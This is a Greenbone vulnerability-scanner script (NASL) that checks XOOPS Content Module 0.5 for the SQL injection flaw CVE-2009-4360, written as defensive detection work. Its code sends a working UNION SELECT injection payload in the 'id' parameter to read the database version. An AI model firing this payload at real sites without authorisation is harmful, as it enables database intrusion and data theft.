# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:xoops:xoops";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900732");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2009-12-24 14:01:59 +0100 (Thu, 24 Dec 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4360");
  script_name("XOOPS Content Module 0.5 SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_xoops_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("XOOPS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/54489");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/37155");
  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/7494");
  script_xref(name:"URL", value:"http://www.packetstormsecurity.org/0911-exploits/xoopscontent-sql.txt");

  script_tag(name:"summary", value:"XOOPS is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"insight", value:"This flaw is due to improper sanitization of data inside 'Content'
  module within the 'id' parameter which lets the remote unauthenticated user to run arbitrary SQL Commands.");

  script_tag(name:"impact", value:"Successful exploitation will let the remote attacker to execute arbitrary SQL
  queries to compromise the remote machine running the vulnerable application.");

  script_tag(name:"affected", value:"XOOPS 'Content' Module 0.5");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/modules/content/index.php?id=1";
req = http_get( item:url, port:port );
res = http_keepalive_send_recv( port:port, data:req );

if( "blockContent" >< res && "blockTitle" >< res ) {

  url = dir + "/modules/content/index.php?id=-1+UNION+SELECT+1,2,3,@@version,5,6,7,8,9,10,11--";
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req );

  if( "Set-Cookie: " >< res && "PHPSESSID" >< res && "path=/" >< res ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
